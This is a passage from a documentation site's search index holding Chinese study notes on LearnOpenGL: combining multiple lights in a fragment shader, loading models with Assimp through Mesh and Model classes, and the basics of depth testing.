camera.Front.z);\nShaderProgram.setFloat(\"spotlight.cutOff\", glm::cos(glm::radians(12.5f)));\nShaderProgram.setFloat(\"spotlight.outerCutOff\", glm::cos(glm::radians(17.5f)));\nShaderProgram.setBool(\"spotlight.useSpotlight\", true);\n</code></pre> <p>\u6211\u4eec\u5e0c\u671b\u5c06\u6240\u6709\u5149\u6e90\u7167\u5c04\u7684\u7ed3\u679c\u7ed3\u5408\u8d77\u6765\uff0c\u90a3\u4e48\u7247\u6bb5\u7740\u8272\u5668\u4e2d\u6e32\u67d3\u7684\u90e8\u5206\u5e94\u8be5\u6709\u5982\u4e0b\u5f62\u5f0f\uff1a</p> <pre><code>void main()\n{\n\n    vec3 norm = normalize(Normal);\n    vec3 viewDir = normalize(viewPos - FragPos);\n\n    // Directional Light\n    vec3 result = CalcDirLight(dirLight, norm, viewDir);\n\n    // Point Light\n    for(int i = 0; i &lt; 4; i++)\n        result += CalcPointLight(pointLights[i], norm, FragPos, viewDir);\n\n    // Spot Light\n    result += CalcSpotLight(spotLight, norm, FragPos, viewDir);\n\n    // emission (if any)\n    vec3 emission = vec3(0.0);\n    float x = TexCoords.x, y = TexCoords.y;\n    result += vec3(texture(material.emission, TexCoords + vec2(0.0, offset)));\n\n    FragColor = vec4(result, alpha);\n}\n</code></pre> <p>\u5404\u4e2a\u51fd\u6570\u5177\u4f53\u7684\u5b9e\u73b0\u53ef\u4ee5\u67e5\u770b https://learnopengl.com/code_viewer_gh.php?code=src/2.lighting/6.multiple_lights/6.multiple_lights.fs</p>"},{"location":"Accumulation/LearnOpenGL/3.%E6%A8%A1%E5%9E%8B%E5%8A%A0%E8%BD%BD/","title":"3. \u6a21\u578b\u52a0\u8f7d","text":""},{"location":"Accumulation/LearnOpenGL/3.%E6%A8%A1%E5%9E%8B%E5%8A%A0%E8%BD%BD/#3","title":"3. \u6a21\u578b\u52a0\u8f7d","text":"<p> \u7ea6 746 \u4e2a\u5b57  310 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p>"},{"location":"Accumulation/LearnOpenGL/3.%E6%A8%A1%E5%9E%8B%E5%8A%A0%E8%BD%BD/#assimp","title":"\u6a21\u578b\u52a0\u8f7d\u5e93 Assimp","text":"<p>\u6a21\u578b\u901a\u5e38\u5728 Blender\u30013DS Max \u6216\u8005 Maya \u8fd9\u79cd\u4e13\u4e1a\u7684\u5de5\u5177\u4e2d\u5236\u4f5c\uff0c\u5bfc\u51fa\u6a21\u578b\u65f6\u4f1a\u81ea\u52a8\u751f\u6210\u6240\u6709\u7684\u9876\u70b9\u5750\u6807\u3001\u9876\u70b9\u53d1\u73b0\u548c\u7eb9\u7406\u5750\u6807\u3002</p> <p>\u6211\u4eec\u9700\u8981\u89e3\u6790\u8fd9\u4e9b\u5bfc\u51fa\u7684\u6a21\u578b\u6587\u4ef6\u4ee5\u53ca\u63d0\u53d6\u6709\u7528\u7684\u4fe1\u606f\uff0c\u5c06\u5b83\u4eec\u5b58\u50a8\u4e3a OpenGL \u6613\u5904\u7406\u7684\u683c\u5f0f\u3002</p> <p>Wavefront \u7684 .obj \u6587\u4ef6\u683c\u5f0f</p> <p>Assimp(Open Asset Import Library) \u662f\u4e00\u4e2a\u975e\u5e38\u6d41\u884c\u7684\u6a21\u578b\u5bfc\u5165\u5e93\uff0c\u5b83\u80fd\u591f\u5c06\u4e0d\u540c\u683c\u5f0f\u7684\u6a21\u578b\u6570\u636e\u89e3\u6790\u5230 Assimp \u7684\u56fa\u5b9a\u6570\u636e\u7ed3\u6784\uff0c\u6211\u4eec\u53ea\u9700\u8981\u7528\u540c\u4e00\u79cd\u65b9\u5f0f\u8bbf\u95ee\u8fd9\u4e9b\u5373\u53ef\u3002</p> <p>\u5f53\u4f7f\u7528 Assimp \u5bfc\u5165\u4e00\u4e2a\u6a21\u578b\u65f6\uff0c\u5b83\u901a\u5e38\u4f1a\u5c06\u6574\u4e2a\u6a21\u578b\u52a0\u8f7d\u8fdb\u4e00\u4e2a Scene Object \u4e2d\uff0c\u5176\u7b80\u5316\u6570\u636e\u7ed3\u6784\u5982\u4e0b\uff1a</p> <p></p> <pre><code>git clone https://github.com/assimp/assimp.git\ncd assimp\ncmake CMakeLists.txt\ncmake --build .\n</code></pre> <p>\u8fd0\u884c\u5b8c\u4e0a\u8ff0\u547d\u4ee4\u540e\uff0c\u53ef\u4ee5\u5728 <code>include</code> \u6587\u4ef6\u5939\u4e2d\u627e\u5230\u9700\u8981\u7684\u5934\u6587\u4ef6\uff0c\u5728 <code>bin/debug</code> \u6587\u4ef6\u5939\u4e2d\u627e\u5230 <code>.dll</code> \u6587\u4ef6\uff0c\u5728 <code>lib/debug</code> \u6587\u4ef6\u5939\u4e2d\u627e\u5230 <code>.lib</code> \u6587\u4ef6\uff0c\u5c06\u5b83\u4eec\u5404\u81ea\u653e\u5728\u5408\u9002\u7684\u4f4d\u7f6e\u3002</p>"},{"location":"Accumulation/LearnOpenGL/3.%E6%A8%A1%E5%9E%8B%E5%8A%A0%E8%BD%BD/#_1","title":"\u7f51\u683c\u7c7b","text":"<p>\u4e00\u4e2a Mesh \u81f3\u5c11\u9700\u8981\u4e00\u4e2a\u9876\u70b9\u96c6\u3001\u7528\u4e8e\u7d22\u5f15\u7ed8\u5236\u7684\u7d22\u5f15\u4ee5\u53ca\u7eb9\u7406\u5f62\u5f0f\u7684\u6750\u8d28\u6570\u636e\u3002\u6211\u4eec\u5c06\u9876\u70b9\u6570\u636e\u548c\u7eb9\u7406\u6570\u636e\u90fd\u6574\u7406\u5230\u4e00\u4e2a\u7ed3\u6784\u4f53\u4e2d\uff1a</p> <pre><code>struct Vertex {\n    glm::vec3 Position;\n    glm::vec3 Normal;\n    glm::vec2 TexCoords;\n};\n\nstruct Texture {\n    unsigned int id;\n    string type;\n};\n</code></pre> <p>\u90a3\u4e48\u4e00\u4e2a Mesh \u7c7b\u7684\u7b80\u5355\u5b9e\u73b0\u67b6\u6784\u5982\u4e0b\uff1a</p> <pre><code>class Mesh {\n    public:\n        /*  \u7f51\u683c\u6570\u636e  */\n        vector&lt;Vertex&gt; vertices;\n        vector&lt;unsigned int&gt; indices;\n        vector&lt;Texture&gt; textures;\n        /*  \u51fd\u6570  */\n        Mesh(vector&lt;Vertex&gt; vertices, vector&lt;unsigned int&gt; indices, vector&lt;Texture&gt; textures);\n        void Draw(Shader &amp;shader);\n    private:\n        /*  \u6e32\u67d3\u6570\u636e  */\n        unsigned int VAO, VBO, EBO;\n        /*  \u51fd\u6570  */\n        void setupMesh();\n};  \n</code></pre> <p>\u5bf9\u4e8e\u6784\u9020\u51fd\u6570\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5c06\u4f20\u5165\u7684\u6570\u636e\u8d4b\u503c\u5230\u6210\u5458\u53d8\u91cf\u5373\u53ef\uff1a</p> <pre><code>Mesh(vector&lt;Vertex&gt; vertices, vector&lt;unsigned int&gt; indices, vector&lt;Texture&gt; textures)\n{\n    this-&gt;vertices = vertices;\n    this-&gt;indices = indices;\n    this-&gt;textures = textures;\n\n    setupMesh(); // \u7528\u4e8e\u521d\u59cb\u5316\u7f13\u5b58\n}\n</code></pre> <p>\u521d\u59cb\u5316\u51fd\u6570 <code>setupMesh</code> \u5219\u548c\u6211\u4eec\u4e4b\u524d\u5e38\u7528\u7684\u6b65\u9aa4\u76f8\u540c\uff0c\u5229\u7528\u8fd9\u4e9b\u9876\u70b9\u6570\u636e\u548c\u7d22\u5f15\u6570\u636e\u521b\u5efa VAO\u3001VBO\u3001EBO \u7b49\u5bf9\u8c61\uff1a</p> <pre><code>void setupMesh()\n{\n    glGenVertexArrays(1, &amp;VAO);\n    glGenBuffers(1, &amp;VBO);\n    glGenBuffers(1, &amp;EBO);\n\n    glBindVertexArray(VAO);\n    glBindBuffer(GL_ARRAY_BUFFER, VBO);\n\n    glBufferData(GL_ARRAY_BUFFER, vertices.size() * sizeof(Vertex), &amp;vertices[0], GL_STATIC_DRAW);  \n\n    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, EBO);\n    glBufferData(GL_ELEMENT_ARRAY_BUFFER, indices.size() * sizeof(unsigned int), \n                 &amp;indices[0], GL_STATIC_DRAW);\n\n    // \u9876\u70b9\u4f4d\u7f6e\n    glEnableVertexAttribArray(0);   \n    glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, sizeof(Vertex), (void*)0);\n    // \u9876\u70b9\u6cd5\u7ebf\n    glEnableVertexAttribArray(1);   \n    glVertexAttribPointer(1, 3, GL_FLOAT, GL_FALSE, sizeof(Vertex), (void*)offsetof(Vertex, Normal));\n    // \u9876\u70b9\u7eb9\u7406\u5750\u6807\n    glEnableVertexAttribArray(2);   \n    glVertexAttribPointer(2, 2, GL_FLOAT, GL_FALSE, sizeof(Vertex), (void*)offsetof(Vertex, TexCoords));\n\n    glBindVertexArray(0);\n}  \n</code></pre> <p>C++\u4e2d\u7ed3\u6784\u4f53\u7684\u5185\u5b58\u5e03\u5c40\u662f\u8fde\u7eed\u7684\uff0c\u56e0\u6b64\u4e3a\u6211\u4eec\u590d\u5236\u6570\u636e\u3001\u8bbe\u7f6e\u9876\u70b9\u5c5e\u6027\u7b49\u64cd\u4f5c\u5e26\u6765\u4e86\u66f4\u597d\u7684\u53ef\u62d3\u5c55\u6027</p> <p>\u7531\u4e8e\u6211\u4eec\u5728\u7eb9\u7406\u7684\u7ed3\u6784\u4f53\u4e2d\u5e76\u6ca1\u6709\u4e13\u95e8\u4e3a\u5176\u5b58\u50a8\u7eb9\u7406\u5bf9\u8c61\u7684\u540d\u79f0\uff0c\u800c\u662f\u4ec5\u4ec5\u5b58\u50a8\u4e86\u7eb9\u7406\u7684\u7c7b\u578b\uff0c\u6240\u4ee5\u6211\u4eec\u5e76\u4e0d\u80fd\u968f\u610f\u7684\u7ed1\u5b9a\u5b83\u4eec\u3002\u4e3a\u4e86\u5b9e\u73b0\u66f4\u9ad8\u7684\u53ef\u62d3\u5c55\u6027\uff0c\u6211\u4eec\u53ef\u4ee5\u5bf9\u7eb9\u7406\u547d\u540d\u8fdb\u884c\u4e00\u4e2a\u89c4\u8303\u9650\u5236\uff0c\u4f8b\u5982\uff0c\u67d0\u4e00\u4e2a\u7f51\u683c\u5177\u6709 3 \u4e2a\u6f2b\u53cd\u5c04\u7eb9\u7406\u548c 2 \u4e2a\u955c\u9762\u53cd\u5c04\u7eb9\u7406\uff0c\u90a3\u4e48\u7740\u8272\u5668\u5185\u7684\u7eb9\u7406\u91c7\u6837\u5668\u547d\u540d\u4e3a\uff1a</p> <pre><code>uniform sampler2D texture_diffuse1;\nuniform sampler2D texture_diffuse2;\nuniform sampler2D texture_diffuse3;\nuniform sampler2D texture_specular1;\nuniform sampler2D texture_specular2;\n</code></pre> <p>\u90a3\u4e48\u5229\u7528\u5b57\u7b26\u4e32\u62fc\u63a5\uff0c\u53ef\u4ee5\u5c06\u6e32\u67d3\u4ee3\u7801\u5199\u4f5c\u5982\u4e0b\uff1a</p> <pre><code>void Draw(Shader shader) \n{\n    unsigned int diffuseNr = 1;\n    unsigned int specularNr = 1;\n    for(unsigned int i = 0; i &lt; textures.size(); i++)\n    {\n        glActiveTexture(GL_TEXTURE0 + i); // \u5728\u7ed1\u5b9a\u4e4b\u524d\u6fc0\u6d3b\u76f8\u5e94\u7684\u7eb9\u7406\u5355\u5143\n        // \u83b7\u53d6\u7eb9\u7406\u5e8f\u53f7\uff08diffuse_textureN \u4e2d\u7684 N\uff09\n        string number;\n        string name = textures[i].type;\n        if(name == \"texture_diffuse\")\n            number = std::to_string(diffuseNr++);\n        else if(name == \"texture_specular\")\n            number = std::to_string(specularNr++);\n\n        shader.setInt((\"material.\" + name + number).c_str(), i);\n        glBindTexture(GL_TEXTURE_2D, textures[i].id);\n    }\n    glActiveTexture(GL_TEXTURE0);\n\n    // \u7ed8\u5236\u7f51\u683c\n    glBindVertexArray(VAO);\n    glDrawElements(GL_TRIANGLES, indices.size(), GL_UNSIGNED_INT, 0);\n    glBindVertexArray(0);\n}\n</code></pre>"},{"location":"Accumulation/LearnOpenGL/3.%E6%A8%A1%E5%9E%8B%E5%8A%A0%E8%BD%BD/#_2","title":"\u5bfc\u5165\u6a21\u578b","text":"<p>\u5728\u4e0a\u4e00\u8282\u6211\u4eec\u6784\u9020\u4e86\u4e00\u4e2a\u80fd\u753b\u51fa\u4e00\u4e2a Mesh \u7684 Mesh \u7c7b\uff0c\u6211\u4eec\u9700\u8981\u5728\u6b64\u57fa\u7840\u4e0a\u521b\u5efa\u4e00\u4e2a model \u7c7b\uff0c\u8981\u6c42\u80fd\u591f\u901a\u8fc7 <code>model.draw()</code> \u51fd\u6570\u76f4\u63a5\u5c06\u8fd9\u4e2a\u6a21\u578b\u7ed8\u5236\u51fa\u6765\uff1a</p> <pre><code>class Model\n{\npublic:\n    // model data \n    vector&lt;Texture&gt; textures_loaded;    // stores all the textures loaded so far, optimization to make sure textures aren't loaded more than once.\n    vector&lt;Mesh&gt;    meshes;\n    string directory;\n    bool gammaCorrection;\n\n    // constructor, expects a filepath to a 3D model.\n    Model(string const&amp; path, bool gamma = false) : gammaCorrection(gamma)\n    {\n        loadModel(path);\n    }\n\n    // draws the model, and thus all its meshes\n    void Draw(Shader&amp; shader)\n    {\n        for (unsigned int i = 0; i &lt; meshes.size(); i++)\n            meshes[i].Draw(shader);\n    }\n}\n</code></pre> <p>\u5728 Model \u7684\u6210\u5458\u51fd\u6570 <code>Draw</code> \u4e2d\uff0c\u6211\u4eec\u8f93\u5165\u7740\u8272\u5668\u7684 ID \u6765\u8c03\u7528\u5bf9\u5e94\u7740\u8272\u5668\u6e32\u67d3\u8fd9\u4e2a Model\uff1b\u800c Model \u7c7b\u7684\u6784\u9020\u51fd\u6570\u5219\u88ab\u5c01\u88c5\u5728 private \u4e2d\uff0c\u5176\u5b9e\u73b0\u5982\u4e0b\uff1a</p> <pre><code>private:\n    // loads a model with supported ASSIMP extensions from file and stores the resulting meshes in the meshes vector.\n    void loadModel(string const&amp; path)\n    {\n        // read file via ASSIMP\n        Assimp::Importer importer;\n        const aiScene* scene = importer.ReadFile(path, aiProcess_Triangulate | aiProcess_GenSmoothNormals | aiProcess_FlipUVs | aiProcess_CalcTangentSpace);\n        // check for errors\n        if (!scene || scene-&gt;mFlags &amp; AI_SCENE_FLAGS_INCOMPLETE || !scene-&gt;mRootNode) // if is Not Zero\n        {\n            cout &lt;&lt; \"ERROR::ASSIMP:: \" &lt;&lt; importer.GetErrorString() &lt;&lt; endl;\n            return;\n        }\n        // retrieve the directory path of the filepath\n        directory = path.substr(0, path.find_last_of('/'));\n\n        // process ASSIMP's root node recursively\n        processNode(scene-&gt;mRootNode, scene);\n    }\n\n    // processes a node in a recursive fashion. Processes each individual mesh located at the node and repeats this process on its children nodes (if any).\n    void processNode(aiNode* node, const aiScene* scene)\n    {\n        // process each mesh located at the current node\n        for (unsigned int i = 0; i &lt; node-&gt;mNumMeshes; i++)\n        {\n            // the node object only contains indices to index the actual objects in the scene. \n            // the scene contains all the data, node is just to keep stuff organized (like relations between nodes).\n            aiMesh* mesh = scene-&gt;mMeshes[node-&gt;mMeshes[i]];\n            meshes.push_back(processMesh(mesh, scene));\n        }\n        // after we've processed all of the meshes (if any) we then recursively process each of the children nodes\n        for (unsigned int i = 0; i &lt; node-&gt;mNumChildren; i++)\n        {\n            processNode(node-&gt;mChildren[i], scene);\n        }\n\n    }\n\n    Mesh processMesh(aiMesh* mesh, const aiScene* scene)\n    {\n        // data to fill\n        vector&lt;Vertex&gt; vertices;\n        vector&lt;unsigned int&gt; indices;\n        vector&lt;Texture&gt; textures;\n\n        // walk through each of the mesh's vertices\n        for (unsigned int i = 0; i &lt; mesh-&gt;mNumVertices; i++)\n        {\n            Vertex vertex;\n            glm::vec3 vector; // we declare a placeholder vector since assimp uses its own vector class that doesn't directly convert to glm's vec3 class so we transfer the data to this placeholder glm::vec3 first.\n            // positions\n            vector.x = mesh-&gt;mVertices[i].x;\n            vector.y = mesh-&gt;mVertices[i].y;\n            vector.z = mesh-&gt;mVertices[i].z;\n            vertex.Position = vector;\n            // normals\n            if (mesh-&gt;HasNormals())\n            {\n                vector.x = mesh-&gt;mNormals[i].x;\n                vector.y = mesh-&gt;mNormals[i].y;\n                vector.z = mesh-&gt;mNormals[i].z;\n                vertex.Normal = vector;\n            }\n            // texture coordinates\n            if (mesh-&gt;mTextureCoords[0]) // does the mesh contain texture coordinates?\n            {\n                glm::vec2 vec;\n                // a vertex can contain up to 8 different texture coordinates. We thus make the assumption that we won't \n                // use models where a vertex can have multiple texture coordinates so we always take the first set (0).\n                vec.x = mesh-&gt;mTextureCoords[0][i].x;\n                vec.y = mesh-&gt;mTextureCoords[0][i].y;\n                vertex.TexCoords = vec;\n                // tangent\n                vector.x = mesh-&gt;mTangents[i].x;\n                vector.y = mesh-&gt;mTangents[i].y;\n                vector.z = mesh-&gt;mTangents[i].z;\n                vertex.Tangent = vector;\n                // bitangent\n                vector.x = mesh-&gt;mBitangents[i].x;\n                vector.y = mesh-&gt;mBitangents[i].y;\n                vector.z = mesh-&gt;mBitangents[i].z;\n                vertex.Bitangent = vector;\n            }\n            else\n                vertex.TexCoords = glm::vec2(0.0f, 0.0f);\n\n            vertices.push_back(vertex);\n        }\n        // now wak through each of the mesh's faces (a face is a mesh its triangle) and retrieve the corresponding vertex indices.\n        for (unsigned int i = 0; i &lt; mesh-&gt;mNumFaces; i++)\n        {\n            aiFace face = mesh-&gt;mFaces[i];\n            // retrieve all indices of the face and store them in the indices vector\n            for (unsigned int j = 0; j &lt; face.mNumIndices; j++)\n                indices.push_back(face.mIndices[j]);\n        }\n        // process materials\n        aiMaterial* material = scene-&gt;mMaterials[mesh-&gt;mMaterialIndex];\n        // we assume a convention for sampler names in the shaders. Each diffuse texture should be named\n        // as 'texture_diffuseN' where N is a sequential number ranging from 1 to MAX_SAMPLER_NUMBER. \n        // Same applies to other texture as the following list summarizes:\n        // diffuse: texture_diffuseN\n        // specular: texture_specularN\n        // normal: texture_normalN\n\n        // 1. diffuse maps\n        vector&lt;Texture&gt; diffuseMaps = loadMaterialTextures(material, aiTextureType_DIFFUSE, \"texture_diffuse\");\n        textures.insert(textures.end(), diffuseMaps.begin(), diffuseMaps.end());\n        // 2. specular maps\n        vector&lt;Texture&gt; specularMaps = loadMaterialTextures(material, aiTextureType_SPECULAR, \"texture_specular\");\n        textures.insert(textures.end(), specularMaps.begin(), specularMaps.end());\n        // 3. normal maps\n        std::vector&lt;Texture&gt; normalMaps = loadMaterialTextures(material, aiTextureType_HEIGHT, \"texture_normal\");\n        textures.insert(textures.end(), normalMaps.begin(), normalMaps.end());\n        // 4. height maps\n        std::vector&lt;Texture&gt; heightMaps = loadMaterialTextures(material, aiTextureType_AMBIENT, \"texture_height\");\n        textures.insert(textures.end(), heightMaps.begin(), heightMaps.end());\n\n        // return a mesh object created from the extracted mesh data\n        return Mesh(vertices, indices, textures);\n    }\n\n    // checks all material textures of a given type and loads the textures if they're not loaded yet.\n    // the required info is returned as a Texture struct.\n    vector&lt;Texture&gt; loadMaterialTextures(aiMaterial* mat, aiTextureType type, string typeName)\n    {\n        vector&lt;Texture&gt; textures;\n        for (unsigned int i = 0; i &lt; mat-&gt;GetTextureCount(type); i++)\n        {\n            aiString str;\n            mat-&gt;GetTexture(type, i, &amp;str);\n            // check if texture was loaded before and if so, continue to next iteration: skip loading a new texture\n            bool skip = false;\n            for (unsigned int j = 0; j &lt; textures_loaded.size(); j++)\n            {\n                if (std::strcmp(textures_loaded[j].path.data(), str.C_Str()) == 0)\n                {\n                    textures.push_back(textures_loaded[j]);\n                    skip = true; // a texture with the same filepath has already been loaded, continue to next one. (optimization)\n                    break;\n                }\n            }\n            if (!skip)\n            {   // if texture hasn't been loaded already, load it\n                Texture texture;\n                texture.id = TextureFromFile(str.C_Str(), this-&gt;directory);\n                texture.type = typeName;\n                texture.path = str.C_Str();\n                textures.push_back(texture);\n                textures_loaded.push_back(texture);  // store it as texture loaded for entire model, to ensure we won't unnecessary load duplicate textures.\n            }\n        }\n        return textures;\n    }\n</code></pre> <p>\u4ece\u6a21\u578b\u6587\u4ef6\u4e2d\u63d0\u53d6\u7eb9\u7406\u7684\u6587\u4ef6\u540d\u7684\u8f85\u52a9\u51fd\u6570 <code>TextureFromFile</code> \u6784\u9020\u5982\u4e0b\uff1a</p> <pre><code>unsigned int TextureFromFile(const char* path, const string&amp; directory, bool gamma)\n{\n    string filename = string(path);\n    filename = directory + '/' + filename;\n\n    unsigned int textureID;\n    glGenTextures(1, &amp;textureID);\n\n    int width, height, nrComponents;\n    unsigned char* data = stbi_load(filename.c_str(), &amp;width, &amp;height, &amp;nrComponents, 0);\n    if (data)\n    {\n        GLenum format;\n        if (nrComponents == 1)\n            format = GL_RED;\n        else if (nrComponents == 3)\n            format = GL_RGB;\n        else if (nrComponents == 4)\n            format = GL_RGBA;\n\n        glBindTexture(GL_TEXTURE_2D, textureID);\n        glTexImage2D(GL_TEXTURE_2D, 0, format, width, height, 0, format, GL_UNSIGNED_BYTE, data);\n        glGenerateMipmap(GL_TEXTURE_2D);\n\n        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\n        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR_MIPMAP_LINEAR);\n        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n\n        stbi_image_free(data);\n    }\n    else\n    {\n        std::cout &lt;&lt; \"Texture failed to load at path: \" &lt;&lt; filename &lt;&lt; std::endl;\n        stbi_image_free(data);\n    }\n\n    return textureID;\n}\n</code></pre> <p>\u53ea\u652f\u6301\u82f1\u6587\uff0c\u6240\u4ee5\u5982\u679c\u4f60\u7684\u6750\u8d28\u547d\u540d\u4e3a\u4e2d\u6587\u7684\u53ef\u4ee5\u7528 pmx editor \u7b49\u5de5\u5177\u4fee\u6539\u4e00\u4e0b</p>"},{"location":"Accumulation/LearnOpenGL/4.%E9%AB%98%E7%BA%A7OpenGL/","title":"4. \u9ad8\u7ea7OpenGL","text":""},{"location":"Accumulation/LearnOpenGL/4.%E9%AB%98%E7%BA%A7OpenGL/#4-opengl","title":"4. \u9ad8\u7ea7OpenGL","text":"<p> \u7ea6 5035 \u4e2a\u5b57  221 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 28 \u5206\u949f</p>"},{"location":"Accumulation/LearnOpenGL/4.%E9%AB%98%E7%BA%A7OpenGL/#_1","title":"\u6df1\u5ea6\u6d4b\u8bd5","text":"<p>\u5728\u524d\u9762\u7684\u7ae0\u8282\u4e2d\uff0c\u6211\u4eec\u901a\u8fc7\u5982\u4e0b\u8bed\u53e5\u5f00\u542f\u548c\u4f7f\u7528\u6df1\u5ea6\u7f13\u51b2\u6765\u9632\u6b62\u88ab\u963b\u6321\u7684\u9762\u6e32\u67d3\u5230\u5176\u5b83\u9762\u524d\u9762\uff1a</p> <pre><code>glEnable(GL_DEPTH_TEST); // \u542f\u7528\u6df1\u5ea6\u6d4b\u8bd5\n\n// in render loop:\nglClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); // \u6e05\u7a7a\u989c\u8272\u7f13\u51b2\u548c\u6df1\u5ea6\u7f13\u51b2\n</code></pre> <p>\u5f53\u6df1\u5ea6\u6d4b\u8bd5\u88ab\u542f\u7528\u65f6\uff0cOpenGL \u4f1a\u5c06\u4e00\u4e2a\u7247\u6bb5\u7684\u6df1\u5ea6\u503c(z)\u4e0e\u6df1\u5ea6\u7f13\u51b2\u7684\u5185\u5bb9\u8fdb\u884c\u5bf9\u6bd4\uff0c\u5982\u679c\u6df1\u5ea6\u6d4b\u8bd5\u901a\u8fc7\u7684\u8bdd\uff0c\u5219\u66f4\u65b0\u6df1\u5ea6\u7f13\u51b2\u3002</p> <p>\u6df1\u5ea6\u7f13\u51b2\u8fd0\u884c\u5728\u7247\u6bb5\u7740\u8272\u5668\u4e4b\u540e\u7684\u5c4f\u5e55\u7a7a\u95f4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 GLSL \u5185\u5efa\u51fd\u6570 <code>gl_FragCoord</code> \u4ece\u7247\u6bb5\u7740\u8272\u5668\u4e2d\u76f4\u63a5\u8bbf\u95ee\u5c4f\u5e55\u7a7a\u95f4\u5750\u6807\uff0c<code>gl_FragCoord</code> \u4e2d\u7684 z \u5206\u91cf\u5c31\u662f\u9700\u8981\u4e0e\u6df1\u5ea6\u7f13\u51b2\u5bf9\u6bd4\u7684\u503c\u3002</p> <p>Early Depth Testing</p> <p>\u73b0\u5728\u5927\u90e8\u5206\u7684GPU\u90fd\u63d0\u4f9b\u4e00\u4e2a\u53eb\u505a\u63d0\u524d\u6df1\u5ea6\u6d4b\u8bd5(Early Depth Testing)\u7684\u786c\u4ef6\u7279\u6027\u3002\u63d0\u524d\u6df1\u5ea6\u6d4b\u8bd5\u5141\u8bb8\u6df1\u5ea6\u6d4b\u8bd5\u5728\u7247\u6bb5\u7740\u8272\u5668\u4e4b\u524d\u8fd0\u884c\u3002\u53ea\u8981\u6211\u4eec\u6e05\u695a\u4e00\u4e2a\u7247\u6bb5\u6c38\u8fdc\u4e0d\u4f1a\u662f\u53ef\u89c1\u7684\uff08\u5b83\u5728\u5176\u4ed6\u7269\u4f53\u4e4b\u540e\uff09\uff0c\u6211\u4eec\u5c31\u80fd\u63d0\u524d\u4e22\u5f03\u8fd9\u4e2a\u7247\u6bb5\u3002</p> <p>\u7247\u6bb5\u7740\u8272\u5668\u901a\u5e38\u5f00\u9500\u90fd\u662f\u5f88\u5927\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5e94\u8be5\u5c3d\u53ef\u80fd\u907f\u514d\u8fd0\u884c\u5b83\u4eec\u3002\u5f53\u4f7f\u7528\u63d0\u524d\u6df1\u5ea6\u6d4b\u8bd5\u65f6\uff0c\u7247\u6bb5\u7740\u8272\u5668\u7684\u4e00\u4e2a\u9650\u5236\u662f\u4f60\u4e0d\u80fd\u5199\u5165\u7247\u6bb5\u7684\u6df1\u5ea6\u503c\u3002\u5982\u679c\u4e00\u4e2a\u7247\u6bb5\u7740\u8272\u5668\u5bf9\u5b83\u7684\u6df1\u5ea6\u503c\u8fdb\u884c\u4e86\u5199\u5165\uff0c\u63d0\u524d\u6df1\u5ea6\u6d4b\u8bd5\u662f\u4e0d\u53ef\u80fd\u7684\u3002OpenGL\u4e0d\u80fd\u63d0\u524d\u77e5\u9053\u6df1\u5ea6\u503c\u3002</p> <p>OpenGL \u5141\u8bb8\u6211\u4eec\u4fee\u6539\u6df1\u5ea6\u6d4b\u8bd5\u65f6\u4f7f\u7528\u7684\u6bd4\u8f83\u7b26\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 <code>glDepthFunc</code> \u51fd\u6570\u6765\u8bbe\u7f6e\uff1a</p> <pre><code>glDepthFunc(GL_LESS);\n</code></pre> <p>\u8fd9\u4e2a\u51fd\u6570\u63a5\u53d7\u4e0b\u9762\u8868\u683c\u4e2d\u7684\u6bd4\u8f83\u8fd0\u7b97\u7b26\uff1a</p> \u51fd\u6570 \u63cf\u8ff0 <code>GL_ALWAYS</code> \u6c38\u8fdc\u901a\u8fc7\u6df1\u5ea6\u6d4b\u8bd5 <code>GL_NEVER</code> \u6c38\u8fdc\u4e0d\u901a\u8fc7\u6df1\u5ea6\u6d4b\u8bd5 <code>GL_LESS</code> \u5728\u7247\u6bb5\u6df1\u5ea6\u503c\u5c0f\u4e8e\u7f13\u51b2\u7684\u6df1\u5ea6\u503c\u65f6\u901a\u8fc7\u6d4b\u8bd5 <code>GL_EQUAL</code> \u5728\u7247\u6bb5\u6df1\u5ea6\u503c\u7b49\u4e8e\u7f13\u51b2\u533a\u7684\u6df1\u5ea6\u503c\u65f6\u901a\u8fc7\u6d4b\u8bd5 <code>GL_LEQUAL</code> \u5728\u7247\u6bb5\u6df1\u5ea6\u503c\u5c0f\u4e8e\u7b49\u4e8e\u7f13\u51b2\u533a\u7684\u6df1\u5ea6\u503c\u65f6\u901a\u8fc7\u6d4b\u8bd5 <code>GL_GREATER</code> \u5728\u7247\u6bb5\u6df1\u5ea6\u503c\u5927\u4e8e\u7f13\u51b2\u533a\u7684\u6df1\u5ea6\u503c\u65f6\u901a\u8fc7\u6d4b\u8bd5 <code>GL_NOTEQUAL</code> \u5728\u7247\u6bb5\u6df1\u5ea6\u503c\u4e0d\u7b49\u4e8e\u7f13\u51b2\u533a\u7684\u6df1\u5ea6\u503c\u65f6\u901a\u8fc7\u6d4b\u8bd5 <code>GL_GEQUAL</code> \u5728\u7247\u6bb5\u6df1\u5ea6\u503c\u5927\u4e8e\u7b49\u4e8e\u7f13\u51b2\u533a\u7684\u6df1\u5ea6\u503c\u65f6\u901a\u8fc7\u6d4b\u8bd5 <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f7f\u7528\u7684\u6df1\u5ea6\u51fd\u6570\u662f <code>GL_LESS</code>\uff0c\u5b83\u5c06\u4f1a\u4e22\u5f03\u6df1\u5ea6\u503c\u5927\u4e8e\u7b49\u4e8e\u5f53\u524d\u6df1\u5ea6\u7f13\u51b2\u503c\u7684\u6240\u6709\u7247\u6bb5\u3002</p> <p>\u6df1\u5ea6\u503c\u7684\u5b9e\u9645\u6570\u503c\u4f4d\u4e8e <code>[0,1]</code> 